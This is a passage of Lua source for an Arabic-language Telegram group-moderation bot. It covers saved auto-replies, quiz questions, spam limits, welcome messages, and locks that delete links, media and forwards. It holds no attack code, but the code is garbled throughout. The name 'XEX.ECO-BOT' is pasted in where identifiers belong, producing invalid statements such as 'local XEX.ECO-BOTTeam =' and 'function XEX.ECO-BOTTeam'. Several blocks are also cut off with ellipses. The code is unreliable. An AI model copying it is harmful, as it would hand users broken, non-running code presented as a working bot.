if text and text:match("^(.*)$") then
local DelGpRed = DevALS:get(XEX.ECO-BOT..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevALS:del(XEX.ECO-BOT..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevALS:get(XEX.ECO-BOT..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevALS:del(XEX.ECO-BOT..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevALS:get(XEX.ECO-BOT.."ALS:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevALS:del(XEX.ECO-BOT.."ALS:Add:AllRed"..msg.sender_user_id_)
DevALS:del(XEX.ECO-BOT.."ALS:Gif:AllRed"..msg.content_.text_)
DevALS:del(XEX.ECO-BOT.."ALS:Voice:AllRed"..msg.content_.text_)
DevALS:del(XEX.ECO-BOT.."ALS:Audio:AllRed"..msg.content_.text_)
DevALS:del(XEX.ECO-BOT.."ALS:Photo:AllRed"..msg.content_.text_)
DevALS:del(XEX.ECO-BOT.."ALS:Stecker:AllRed"..msg.content_.text_)
DevALS:del(XEX.ECO-BOT.."ALS:Video:AllRed"..msg.content_.text_)
DevALS:del(XEX.ECO-BOT.."ALS:File:AllRed"..msg.content_.text_)
DevALS:del(XEX.ECO-BOT.."ALS:Text:AllRed"..msg.content_.text_)
DevALS:del(XEX.ECO-BOT.."ALS:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source XEX.ECO-BOT     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevALS:get(XEX.ECO-BOT..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevALS:get(XEX.ECO-BOT..'ALS:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙☆︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevALS:del(XEX.ECO-BOT..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevALS:sadd(XEX.ECO-BOT..'ALS:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
...
if text and not DevALS:get(XEX.ECO-BOT..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevALS:sismember(XEX.ECO-BOT..'ALS:Manager:GpRedod'..msg.chat_id_,text) then
local XEX.ECO-BOTTeam =  DevALS:smembers(XEX.ECO-BOT..'ALS:Text:GpTexts'..text..msg.chat_id_)
Dev_ALS(msg.chat_id_, msg.id_, 1, '['..XEX.ECO-BOTTeam[math.random(#XEX.ECO-BOTTeam)]..']' , 1, 'md')  
end
end
--     Source XEX.ECO-BOT     --
if text and text:match("^(.*)$") then
local SaveKt = DevALS:get(XEX.ECO-BOT..'ALS:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
if SaveKt == 'SaveKt' then
local GetKtTexts = DevALS:get(XEX.ECO-BOT..'ALS:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Text:KtTexts'..GetKtTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙☆︙تم الغاء عملية حفظ اسئلة الكت  ↫ "..GetKtTexts ,  1, "md")
DevALS:del(XEX.ECO-BOT..'ALS:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Text:KtTexts'..GetKtTexts..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Sudo:Kt'..msg.chat_id_,GetKtTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevALS:sadd(XEX.ECO-BOT..'ALS:Text:KtTexts'..GetKtTexts..msg.chat_id_,Text)
if #List == 100 then 
...
if text and not DevALS:get(XEX.ECO-BOT..'ALS:Add:Kt'..msg.sender_user_id_..msg.chat_id_) then
if DevALS:sismember(XEX.ECO-BOT..'ALS:Sudo:Kt'..msg.chat_id_,text) then
local DavidTeam =  DevALS:smembers(XEX.ECO-BOT..'ALS:Text:KtTexts'..text..msg.chat_id_)
Dev_ALS(msg.chat_id_, msg.id_, 1, '['..DavidTeam[math.random(#DavidTeam)]..']' , 1, 'md')  
end
end
--     Source XEX.ECO-BOT     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevALS:get(XEX.ECO-BOT..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevALS:get(XEX.ECO-BOT..'DelManagerRep'..msg.chat_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء حفظ الرد', 1, 'md')
DevALS:del(XEX.ECO-BOT..'ALS:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'DelManagerRep'..msg.chat_id_)
return false
end
DevALS:del(XEX.ECO-BOT..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevALS:get(XEX.ECO-BOT..'ALS:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevALS:set(XEX.ECO-BOT..'ALS:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevALS:set(XEX.ECO-BOT..'ALS:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevALS:set(XEX.ECO-BOT..'ALS:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevALS:set(XEX.ECO-BOT..'ALS:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevALS:set(XEX.ECO-BOT..'ALS:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
...
DevALS:set(XEX.ECO-BOT..'ALS:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevALS:set(XEX.ECO-BOT..'ALS:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevALS:set(XEX.ECO-BOT..'ALS:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
...
if msg.content_.text_ and not DevALS:get(XEX.ECO-BOT..'ALS:Lock:GpRed'..msg.chat_id_) then 
if DevALS:get(XEX.ECO-BOT..'ALS:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevALS:get(XEX.ECO-BOT..'ALS:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevALS:get(XEX.ECO-BOT..'ALS:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevALS:get(XEX.ECO-BOT..'ALS:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevALS:get(XEX.ECO-BOT..'ALS:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(XEX.ECO-BOT..'ALS:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevALS:get(XEX.ECO-BOT..'ALS:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(XEX.ECO-BOT..'ALS:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevALS:get(XEX.ECO-BOT..'ALS:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(XEX.ECO-BOT..'ALS:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevALS:get(XEX.ECO-BOT..'ALS:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(XEX.ECO-BOT..'ALS:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevALS:get(XEX.ECO-BOT..'ALS:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevALS:get(XEX.ECO-BOT..'ALS:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevALS:get(XEX.ECO-BOT..'ALS:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function XEX.ECO-BOTTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevALS:get(XEX.ECO-BOT..'ALS:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevALS:get(XEX.ECO-BOT..'ALS:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevALS:get(XEX.ECO-BOT..'ALS:Text:GpRed'..msg.content_.text_..msg.chat_id_)
...
getUser(msg.sender_user_id_, XEX.ECO-BOTTeam)
end
end
--     Source XEX.ECO-BOT     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevALS:get(XEX.ECO-BOT.."ALS:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevALS:get(XEX.ECO-BOT..'DelSudoRep')
DevALS:del(XEX.ECO-BOT.."ALS:Sudo:AllRed",DelSudoRep)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء حفظ الرد', 1, 'md')
DevALS:del(XEX.ECO-BOT.."ALS:Add:AllText"..msg.sender_user_id_)
DevALS:del(XEX.ECO-BOT.."ALS:Add:AllRed"..msg.sender_user_id_)
DevALS:del(XEX.ECO-BOT.."DelSudoRep")
return false
end
DevALS:del(XEX.ECO-BOT.."ALS:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevALS:get(XEX.ECO-BOT.."ALS:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevALS:set(XEX.ECO-BOT.."ALS:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevALS:set(XEX.ECO-BOT.."ALS:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevALS:set(XEX.ECO-BOT.."ALS:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevALS:set(XEX.ECO-BOT.."ALS:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevALS:set(XEX.ECO-BOT.."ALS:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
...
DevALS:set(XEX.ECO-BOT.."ALS:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevALS:set(XEX.ECO-BOT.."ALS:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevALS:set(XEX.ECO-BOT.."ALS:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم حفظ الرد الجديد', 1, 'md') 
DevALS:del(XEX.ECO-BOT.."ALS:Add:AllText"..msg.sender_user_id_)
DevALS:del(XEX.ECO-BOT..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevALS:get(XEX.ECO-BOT..'ALS:Lock:AllRed'..msg.chat_id_) then
if DevALS:get(XEX.ECO-BOT.."ALS:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevALS:get(XEX.ECO-BOT.."ALS:Video:AllRed"..msg.content_.text_))
end
if DevALS:get(XEX.ECO-BOT.."ALS:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevALS:get(XEX.ECO-BOT.."ALS:File:AllRed"..msg.content_.text_))
end
if DevALS:get(XEX.ECO-BOT.."ALS:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(XEX.ECO-BOT.."ALS:Voice:AllRed"..msg.content_.text_))
end
if DevALS:get(XEX.ECO-BOT.."ALS:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(XEX.ECO-BOT.."ALS:Audio:AllRed"..msg.content_.text_))
end
if DevALS:get(XEX.ECO-BOT.."ALS:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(XEX.ECO-BOT.."ALS:Photo:AllRed"..msg.content_.text_))
end
if  DevALS:get(XEX.ECO-BOT.."ALS:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(XEX.ECO-BOT.."ALS:Gif:AllRed"..msg.content_.text_))
end
if DevALS:get(XEX.ECO-BOT.."ALS:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevALS:get(XEX.ECO-BOT.."ALS:Stecker:AllRed"..msg.content_.text_))
end
if DevALS:get(XEX.ECO-BOT.."ALS:Text:AllRed"..msg.content_.text_) then
function XEX.ECO-BOTTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevALS:get(XEX.ECO-BOT..'ALS:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevALS:get(XEX.ECO-BOT..'ALS:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevALS:get(XEX.ECO-BOT.."ALS:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
...
if Type == "keed" and not DevALS:sismember(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
...
if Type == "mute" and not DevALS:sismember(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevALS:sadd(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
...
--  end functions XEX.ECO-BOT --
--     Source XEX.ECO-BOT     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= XEX.ECO-BOT then
floods = DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevALS:get(XEX.ECO-BOT.."ALS:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevALS:setex(XEX.ECO-BOT.."ALS:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source XEX.ECO-BOT     --
...
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(XEX.ECO-BOT) then
DevALS:set(XEX.ECO-BOT..'ALS:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevALS:get(XEX.ECO-BOT..'ALS:PinnedMsg'..msg.chat_id_)
if pin_id and DevALS:get(XEX.ECO-BOT..'ALS:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevALS:get(XEX.ECO-BOT..'ALS:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevALS:del(XEX.ECO-BOT..'ALS:viewget'..msg.sender_user_id_)
else
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if not VipMem(msg) then
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source XEX.ECO-BOT     --
...
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevALS:get(XEX.ECO-BOT..'ALS:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevALS:get(XEX.ECO-BOT..'ALS:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• @username'
end
...
if DevALS:get(XEX.ECO-BOT.."ALS:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source XEX.ECO-BOT     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = XEX.ECO-BOT,offset_ = 0,limit_ = 1},function(extra,ALS,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(XEX.ECO-BOT) then 
if DevALS:sismember(XEX.ECO-BOT..'ALS:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n☆︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n☆︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n☆︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevALS:get(XEX.ECO-BOT.."ALS:Text:BotWelcome") then ALSText = DevALS:get(XEX.ECO-BOT.."ALS:Text:BotWelcome") else ALSText = "☆︙مرحبا انا بوت اسمي "..NameBot.."\n☆︙حالة المجموعه ↫ "..BotText.."\n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉" end 
if DevALS:get(XEX.ECO-BOT.."ALS:Photo:BotWelcome") then ALSPhoto = DevALS:get(XEX.ECO-BOT.."ALS:Photo:BotWelcome") elseif ALS.photos_[0] then ALSPhoto = ALS.photos_[0].sizes_[1].photo_.persistent_id_ else ALSPhoto = nil end 
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source XEX.ECO-BOT     --
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevALS:get(XEX.ECO-BOT..'ALS:Spam:Text'..msg.chat_id_))
end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
--     Source XEX.ECO-BOT     --
if DevALS:get(XEX.ECO-BOT.."ALS:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"☆︙تم الغاء حفظ الرابط")       
DevALS:del(XEX.ECO-BOT.."ALS:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevALS:set(XEX.ECO-BOT.."ALS:Groups:Links"..msg.chat_id_,Link)
...
if DevALS:get('XEX.ECO-BOTTeam:'..XEX.ECO-BOT.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevALS:del('XEX.ECO-BOTTeam:'..XEX.ECO-BOT..'id:user'..msg.chat_id_)  
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء الامر', 1, 'md')
DevALS:del('XEX.ECO-BOTTeam:'..XEX.ECO-BOT.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevALS:del('XEX.ECO-BOTTeam:'..XEX.ECO-BOT.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevALS:get('XEX.ECO-BOTTeam:'..XEX.ECO-BOT..'id:user'..msg.chat_id_)  
DevALS:incrby(XEX.ECO-BOT..'ALS:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_ALS(msg.chat_id_, msg.id_,  1, "☆︙تم اضافة "..numadded..' رساله', 1, 'md')
DevALS:del('XEX.ECO-BOTTeam:'..XEX.ECO-BOT..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevALS:get('XEX.ECO-BOTTeam:'..XEX.ECO-BOT.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevALS:del('XEX.ECO-BOTTeam:'..XEX.ECO-BOT..'ids:user'..msg.chat_id_)  
